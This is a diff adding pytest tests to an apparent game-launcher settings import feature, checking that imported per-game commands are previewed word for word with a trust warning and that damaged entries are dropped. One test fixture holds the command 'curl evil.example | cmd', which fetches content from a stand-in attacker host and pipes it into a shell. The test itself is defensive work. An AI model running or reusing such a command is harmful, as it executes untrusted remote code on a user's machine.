@@ -74,6 +74,32 @@ def test_a_damaged_engine_options_entry_is_dropped(two_screens):
     assert "engine_args" not in target["games"]["steam:1"]
 
 
+def test_an_import_shows_every_command_it_would_add_word_for_word(two_screens, cfg, tmp_path):
+    """A profile file can come from anyone; its commands run on this PC, so the preview names them."""
+    cfg["games"]["steam:620"]["commands"] = {"before": "curl evil.example | cmd"}
+    cfg["commands"] = {"before": "", "after": "echo bye"}
+    data = transfer.read_export(transfer.write_export(cfg, tmp_path / "out.json"))
+    summary = transfer.merge({}, data)
+    assert summary.commands == ["Every game (after): echo bye", "Portal 2 (before): curl evil.example | cmd"]
+    assert "Only apply it if you trust where it came from" in summary.lines()[0]
+
+
+def test_commands_already_here_arent_flagged_again(two_screens, cfg, tmp_path):
+    cfg["games"]["steam:620"]["commands"] = {"before": "echo hi"}
+    data = transfer.read_export(transfer.write_export(cfg, tmp_path / "out.json"))
+    assert transfer.restore(cfg, data).commands == []
+
+
+def test_damaged_commands_are_dropped(two_screens):
+    data = {"kind": transfer.KIND, "format": 1,
+            "settings": {"commands": "not a dict"},
+            "games": {"steam:1": {"name": "X", "store": "steam", "commands": {"before": 5}}}}
+    target = {}
+    summary = transfer.merge(target, data)
+    assert "commands" not in target["games"]["steam:1"] and "commands" not in target
+    assert summary.commands == []
+
+
 def test_hidden_games_travel_with_the_settings(two_screens, cfg):
     cfg["hidden_games"] = ["gog:99"]
     assert transfer.export_data(cfg)["settings"]["hidden_games"] == ["gog:99"]
